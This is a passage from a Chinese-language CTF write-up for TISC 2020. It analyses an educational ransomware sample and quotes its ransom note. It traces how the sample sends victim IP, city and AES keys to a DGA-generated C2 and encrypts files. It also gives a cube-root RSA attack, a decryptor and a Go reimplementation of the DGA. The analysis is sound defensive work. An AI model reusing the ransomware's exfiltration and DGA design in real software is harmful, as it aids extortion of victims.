qgkvXZpufffTfjTB+je/Wi43bwLqtw0W4cXoPW33uGVaWZX0oLzKC/Axg7kwItmG
xnn321TAjEZgTbL+OaNkcHzfQ7UzwaEp9UPtT8pGYoNJHlX3fkFq2iVy77uI4gRK
Mf8ujTfkIHHjQ7BEzgEgk8kqxGaSPlINQs65P4tvOpihqpwUVpAjPLNBTt9Hz1F/
fR+aDsJQRKZNMrWRLuMYiO2Mx9cZBnwzL9KuFRvHelO7BWayU9f0XOpg/zybEQOL
ux+jmsUsTsQbjK9cB67Ma21D+XJHyKgKuP9u14mVCZgCBk9lybS1bxdvFDQPgkyc
M3z9vuucCU1Eu2D0lhFmJ3FQfZkAY++XHUpiwui9NO3A9UG7amyXbOSclF2X9kRq
0CwmqOtBRBEWISe5rdzc/ATOP3PqDjGwySXxWZDCH8rrgnzWpv2LriYQTnf2cE0G
/iI8RwjYoGLWzeLVRr1hhZ8Y5s4R/sR497WenkRcpOLOkDVge7MusTOWh4eNi4go
PldsiYTqTndA1wV67r09ujpp8VvpdLuo+4h+7p/pfpXMsx8dALom4sfkYcJHhObk
xt5CpNCkVXh5tsGheFb7v85GiNFy17zualMda32BinPeEbFrqKwD2Z4R5QgQuB8u
IwjqSTgNo9Uvvch6lWCbj9e+80ugV4o7jHCd/56FkuvhCqiINdZDUU4ZB37hdelf
eE9NbxDjKG8V7aCdwqJJDYGiz/3jmuCfB/k5FkoHSANgbLE0A5Smk3T8tuv8Sz+f
v4rrPxmpn8X2Sm1Foz+U0BWzP+VLmpLnnyXkrOHyn8lJFbn/U5NWGRLn+ev2CSkw
AI/TfHALqTvjqlGQxTTaY7Znkn5i+D1LztK8cpSZXdDVoRh+/vMIEiNuk8++/s6a
HNd7wuFkY/Z8jjJ1jH/csF37mGYAUxp32nRk5wRp/c6eWZPM+zGibfEnmFW5yUEU
YbX4hzzGr5Q6f/sysuzhaylWi3XCvIrH6LBjFNu3UJ0VIzcJN0kxaABaXY8JUDYX
tXULipvUOqkttOqJSxOXWg72SWKLKv/QvfDRVXedUk066k7RL1okpbMnwYlfYg7J
mpZZR2CNNwbMkQm2TmrA/MZudvqtsX9PpkgJI+ZWjUwVtGRUTdDMxZWx4H3neJiy
8m8udk42RN0j3n0wVXsWt6Qmy7bQsHYXIHUgkBXYzdy/u+NodKAjhdVpiJbzIncz
SdolXiniKwNULW8VjjS9KTSRwidqeOkkpNeIqiRnWT3TTMAMzb5j0jEGF7L3DOMP
<span class="token assign-left variable">6QIBAw</span><span class="token operator">==</span>
-----END PUBLIC KEY-----

r10@kali:~/tisc$ <span class="token builtin class-name">printf</span> <span class="token string">"TISC20&#123;%s&#125;"</span> <span class="token variable"><span class="token variable">$(</span>public_key <span class="token operator">|</span> shasum -a <span class="token number">256</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">' '</span> -f <span class="token number">1</span><span class="token variable">)</span></span>
TISC20<span class="token punctuation">&#123;</span>8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee<span class="token punctuation">&#125;</span></code></pre>

<p><strong>Flag:</strong> <code>TISC20&#123;8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee&#125;</code></p>
<h2 id="STAGE-3-Recover-some-files"><a href="#STAGE-3-Recover-some-files" class="headerlink" title="STAGE 3: Recover some files"></a>STAGE 3: Recover some files</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914170260-s3-0.jpg" srcset="/img/loading.gif"></p>
<p>这一关需要对Stage 2提供的<code>encrypted.zip</code>文件中被加密的文件进行解密。为了达到这个目的，我们需要了解勒索文件<code>anorocware</code>的内部运行流程。对<code>main.mian</code>进行检查，可以发现赎金条(ransom note)被写入<code>ransomnote-anoroc.txt</code>文件中:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914323463-s3-1.jpg" srcset="/img/loading.gif"></p>
<p>赎金条包含一个先前计算的<code>machineid.ID()</code>:</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______&#x2F;  \______&#x2F;

Hello Sir &#x2F; Madam,

Your computer has been hax0red and your files are now to belong to me.
We use military grade cryptography code to encrypt ur filez.
Do not try anything stupid, u will lose ur beloved data.

You have 48 hours to pay 1 Ethereum (ETH) to 0xc184e8BB0c8AA7326056D21C4Badf3eE58f04af2.
Email divoc-91@protonmail.ch proof of your transaction to obtain your decryption keys.
PLEASE INCLUDE YOUR MACHINE-ID &#x3D; 6d8da77f503c9a5560073c13122a903b IN YOUR EMAIL

Your move,
Anor0cW4re Team

+++++ +++++ +++++ +++++ +++++ +++++

DO NOT BE ALARMED;
DO NOT SEND ETHEREUM TO ANY ACCOUNT;
THIS IS AN EDUCATIONAL RANSOMWARE
FOR CYBER SECURITY TRAINING;

+++++ +++++ +++++ +++++ +++++ +++++</code></pre>

<p>然后,URL<code>https://ifconfig.co/json</code>获取受害者网络的信息，填充了<code>city</code>和<code>ip</code>参数：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914556056-s3-2.jpg" srcset="/img/loading.gif"><br>然后，生成两个随机数，分别代表<code>encryption key``encryption IV</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914713968-s3-3.jpg" srcset="/img/loading.gif"><br>然后，构造JOSN结构数据，包含字段<code>City``EncIV``EncKey``IP``MachineId</code>:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915179423-s3-4.jpg" srcset="/img/loading.gif"><br>随后，对公钥进行解密、编码、解析：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915318395-s3-5.jpg" srcset="/img/loading.gif"><br>接着，对JOSN字段进行URL编码：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915484079-s3-6.jpg" srcset="/img/loading.gif"><br>处理后JOSN数据被转换为一个大数并求幂，可以理解为进行RSA操作：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915730355-s3-7.jpg" srcset="/img/loading.gif"><br>随后，所有的数据将被写入<code>keydetails-enc.txt</code>文件中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915970085-s3-8.jpg" srcset="/img/loading.gif"><br>与此同时，域名生成算法<code>main.QbznvaAnzrTrarengvbaNytbevguz</code>执行，生成C2域名，并发送报告：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916218483-s3-9.jpg" srcset="/img/loading.gif"><br>最后，通过<code>main.visit.func1</code>函数遍历整个目录，完成所有文件加密：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916356647-s3-10.jpg" srcset="/img/loading.gif"><br>接下来，分析<code>main.visit.func1</code>函数，使用<code>EncKey</code>对AES-128密码进行初始化来对文件加密：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916613173-s3-11.jpg" srcset="/img/loading.gif"><br>通过分析发现，IV并不是一个常量，而是将IV的前两个字节设置为文件名的前两个字节：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916725702-s3-12.jpg" srcset="/img/loading.gif"><br>密码设置为CTR模式，加密数据输出到<code>.anoroc</code>后缀的文件中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600917117875-s3-13.jpg" srcset="/img/loading.gif"><br>分析完毕了整个加密逻辑，为了进行文件解密，首先需要检查公钥：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ openssl rsa -noout -text -inform PEM -in ./pub_key -pubin
Public-Key: <span class="token punctuation">(</span><span class="token number">8192</span> bit<span class="token punctuation">)</span>
Modulus:
    00:9b:df:5b:da:9b:ed:ad:58:96:fa:33:7f:dc:d1:
    5f:c3:c8:37:e9:d4:11:ea:22:6b:f9:cc:91:7b:e9:
    3c:5c:5c:ee:1d:43:b8:2c:dd:ed:93:be:ad:15:2f:
    03:6d:a0:9c:60:58:ae:7f:c1:ac:ba:07:11:99:00:
    c4:ac:f6:5f:aa:09:2f:5d:9a:6e:7d:f7:d3:7e:34:
<span class="token punctuation">..</span>.
    bf:bb:e3:68:74:a0:23:85:d5:69:88:96:f3:22:77:
    <span class="token number">33</span>:49:da:25:5e:29:e2:2b:03:54:2d:6f:15:8e:34:
    bd:29:34:91:c2:27:6a:78:e9:24:a4:d7:88:aa:24:
    <span class="token number">67</span>:59:3d:d3:4c:c0:0c:cd:be:63:d2:31:06:17:b2:
    f7:0c:e3:0f:e9
Exponent: <span class="token number">3</span> <span class="token punctuation">(</span>0x3<span class="token punctuation">)</span></code></pre>

<p>这里指数为3，可以采用<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/33561/cube-root-attack-rsa-with-low-exponent">cube-root attack</a>思路。首先，将密文转换为十六进制：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii
data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./dockerize/encrypted/keydetails-enc.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0x"</span> <span class="token operator">+</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>'</code></pre>

<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python conv_hex.py
0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e453ec6
9b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b250f
6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce50a6
9c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e7910
3abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971bfaf7
a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca37651890894
25a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445150c
037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd860ef7
9ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347c5d8
5ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce670248
66d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa5084555
f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b7297d3a
16978f4a974cf2d04088</code></pre>

<p>接着可以用Sage计算立方根：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>util <span class="token keyword">import</span> bin_to_ascii<span class="token punctuation">,</span> ascii_to_bin

c <span class="token operator">=</span> <span class="token number">0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e45</span>
<span class="token number">3ec69b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b</span>
<span class="token number">250f6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce</span>
<span class="token number">50a69c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e</span>
<span class="token number">79103abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971b</span>
faf7a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca3765189
<span class="token number">089425a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445</span>
<span class="token number">150c037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd86</span>
<span class="token number">0ef79ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347</span>
c5d85ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce67
<span class="token number">024866d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa508</span>
<span class="token number">4555f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b729</span>
<span class="token number">7d3a16978f4a974cf2d04088</span>
ci <span class="token operator">=</span> Integer<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ci<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span>
pa <span class="token operator">=</span> p<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>binary<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bin_to_ascii<span class="token punctuation">(</span><span class="token string">"0"</span> <span class="token operator">+</span> pa<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>得到<code>EncKey``EndIV</code>等字段的值：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">City&#x3D;Singapore&amp;EncIV&#x3D;%1C%9F%A4%9B%2C%9EN%AF%04%9CA%AE%02%86%03%81&amp;EncKey&#x3D;%99z%11%12%7FjD%22%93%D2%A8%EB%1D2u%04&amp;IP&#x3D;112.199.210.119&amp;MachineId&#x3D;6d8da77f503c9a5560073c13122a903b</code></pre>

<p>编写<code>decrypt_anoroc.py</code>对文件进行解密：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> Counter
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os<span class="token punctuation">.</span>path

IV <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'1c9fa49b2c9e4eaf049c41ae02860381'</span><span class="token punctuation">)</span>
KEY <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'997a11127f6a442293d2a8eb1d327504'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    output <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    base <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
    new_iv <span class="token operator">=</span> base<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> IV<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CTR<span class="token punctuation">,</span> initial_value<span class="token operator">=</span>new_iv<span class="token punctuation">,</span> nonce<span class="token operator">=</span><span class="token string">b''</span><span class="token punctuation">)</span>
    mt_bytes <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>mt_bytes<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>最终在解密后的数据库中找到flag:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python decrypt_anoroc.py ./encrypted/secret_investments.db.anoroc decrypted/secret_investments.db
r10@kali:~/tisc$ sqlite3 decrypted/secret_investments.db
SQLite version <span class="token number">3.31</span>.1 <span class="token number">2020</span>-01-27 <span class="token number">19</span>:55:54
Enter <span class="token string">".help"</span> <span class="token keyword">for</span> usage hints.
sqlite<span class="token operator">></span> .schema
CREATE TABLE IF NOT EXISTS <span class="token string">"stocks"</span> <span class="token punctuation">(</span>
	<span class="token string">"id"</span>	INTEGER NOT NULL UNIQUE,
	<span class="token string">"symbol"</span>	TEXT,
	<span class="token string">"shares_held"</span>	INTEGER,
	<span class="token string">"target"</span>	INTEGER,
	PRIMARY KEY<span class="token punctuation">(</span><span class="token string">"id"</span> AUTOINCREMENT<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
CREATE TABLE sqlite_sequence<span class="token punctuation">(</span>name,seq<span class="token punctuation">)</span><span class="token punctuation">;</span>
CREATE TABLE IF NOT EXISTS <span class="token string">"ctf_flag"</span> <span class="token punctuation">(</span>
	<span class="token string">"id"</span>	INTEGER NOT NULL UNIQUE,
	<span class="token string">"comp"</span>	TEXT,
	<span class="token string">"flag"</span>	TEXT,
	PRIMARY KEY<span class="token punctuation">(</span><span class="token string">"id"</span> AUTOINCREMENT<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

sqlite<span class="token operator">></span> <span class="token keyword">select</span> * from ctf_flag<span class="token punctuation">;</span>
<span class="token number">1</span><span class="token operator">|</span>TSIC20<span class="token operator">|</span>TISC20<span class="token punctuation">&#123;</span>u_decrypted_d4_fil3s_w0w_82161874619846<span class="token punctuation">&#125;</span></code></pre>

<p><strong>Flag:</strong> <code>TISC20&#123;u_decrypted_d4_fil3s_w0w_82161874619846&#125;</code></p>
<h2 id="Stage-4-Where-is-the-C2"><a href="#Stage-4-Where-is-the-C2" class="headerlink" title="Stage 4: Where is the C2?"></a>Stage 4: Where is the C2?</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600918591342-s4-0.jpg" srcset="/img/loading.gif"><br>连接服务器得到提示：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______&#x2F;  \______&#x2F;

CSIT&#39;s The Infosecurity Challenge 2020
https:&#x2F;&#x2F;play.tisc.csit-events.sg&#x2F;

CHALLENGE 4: WHERE IS THE C2?
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsr
Where (domain name) can we find the ransomware servers on 2054-03-21T16:19:03.000Z?</code></pre>

<p>在Stage 3中我们分析得到<code>main.QbznvaAnzrTrarengvbaNytbevguz</code>函数生成了C2域名。对该函数进行进一步分析，发现它在端点<code>https://worldtimeapi.org/api/timezone/Etc/UTC.json</code>获取一个JOSN数据并进行编码：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919147958-s4-1.jpg" srcset="/img/loading.gif"><br>该端点返回一堆与时区有关的值：</p>
<pre class="language-none"><code class="language-none">&#123;
   &quot;abbreviation&quot;:&quot;UTC&quot;,
   &quot;client_ip&quot;:&quot;&lt;IP ADDRESS&gt;&quot;,
   &quot;datetime&quot;:&quot;2020-09-17T21:29:49.031611+00:00&quot;,
   &quot;day_of_week&quot;:1,
   &quot;day_of_year&quot;:251,
   &quot;dst&quot;:false,
   &quot;dst_from&quot;:null,
   &quot;dst_offset&quot;:0,
   &quot;dst_until&quot;:null,
   &quot;raw_offset&quot;:0,
   &quot;timezone&quot;:&quot;Etc&#x2F;UTC&quot;,
   &quot;unixtime&quot;:1599506733,
   &quot;utc_datetime&quot;:&quot;2020-09-17T21:29:49.031611+00:00&quot;,
   &quot;utc_offset&quot;:&quot;+00:00&quot;,
   &quot;week_number&quot;:38
&#125;</code></pre>

<p>为了更好分析，这里将端点地址改为本地<code>localhost</code>:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919528765-s4-2.jpg" srcset="/img/loading.gif"><br>首先，<code>time.now()</code>获取当前系统的时间：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919630370-s4-3.jpg" srcset="/img/loading.gif"><br>然后，JOSN数据中的<code>unixtime</code>字段被获取：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919768801-s4-4.jpg" srcset="/img/loading.gif"><br>随后生成一个随机种子、一个代表域名可变长度的的随机数<code>ath/rand.(*Rand).Intn(0x20)</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600921673034-s4-5.jpg" srcset="/img/loading.gif"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600921679064-s4-6.jpg" srcset="/img/loading.gif"><br>这个可变长度值被加入到<code>0x20</code>值中组成基本域名的长度：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600925601046-s4-7.jpg" srcset="/img/loading.gif"><br>当不满足终止条件时，再计算一个随机值<code>math/rand.(*Rand).Intn(0x539) % 0x24</code>最为字符数字<code>charset</code>的索引，并添加到结果域名的字符串中。这里，<code>charset</code>为<code>kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600925933507-s4-8.jpg" srcset="/img/loading.gif"><br>当满足终止条件时，计算域名的根和前缀：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600926059617-s4-9.jpg" srcset="/img/loading.gif"><br>这里有9中不同的根域的可能性：<code>.catbox.moe</code> <code>.cf</code> <code>.ga</code> <code>.gq</code> <code>.mixtape.moe</code> <code>.ml</code> <code>.nyaa.net</code>  <code>.tk</code>  <code>.pomf.io</code> 。<br>编写一个go程序<code>test_random.go</code>来计算所需的域名:</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"bytes"</span>
    <span class="token string">"os"</span>
    <span class="token string">"strconv"</span>
    <span class="token string">"math/rand"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    charset <span class="token operator">:=</span> <span class="token string">"kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7"</span>
    epoch<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    seed <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span>epoch <span class="token operator">>></span> <span class="token number">0xf</span><span class="token punctuation">)</span>

    rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>

    lengthener <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>

    buff <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBufferString</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> lengthener<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
        current_num <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x539</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
        current_num <span class="token operator">=</span> current_num <span class="token operator">%</span> <span class="token number">0x24</span>
        <span class="token comment">//fmt.Println(current_num)</span>
        buff<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>charset<span class="token punctuation">[</span>current_num<span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

    root_part <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x7a69</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span>
    <span class="token comment">//fmt.Println(root_part)</span>
    parts <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">".mixtape.moe"</span><span class="token punctuation">,</span> <span class="token string">".catbox.moe"</span><span class="token punctuation">,</span> <span class="token string">".tk"</span><span class="token punctuation">,</span> <span class="token string">".nyaa.net"</span><span class="token punctuation">,</span> <span class="token string">".gq"</span><span class="token punctuation">,</span> <span class="token string">".pomf.io"</span><span class="token punctuation">,</span>
    <span class="token string">".cf"</span><span class="token punctuation">,</span> <span class="token string">".ga"</span><span class="token punctuation">,</span> <span class="token string">".ml"</span><span class="token punctuation">&#125;</span>
    <span class="token comment">//fmt.Println(root_part)</span>

    buff<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span>root_part<span class="token punctuation">]</span><span class="token punctuation">)</span>

    domain <span class="token operator">:=</span> buff<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>domain<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>随后编写python脚本<code>solver.py</code>进行问题的解决：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime
<span class="token keyword">import</span> pytz

<span class="token keyword">def</span> <span class="token function">get_answer</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test_random &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    domain <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> domain

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg"</span><span class="token punctuation">,</span> <span class="token number">31090</span><span class="token punctuation">)</span>
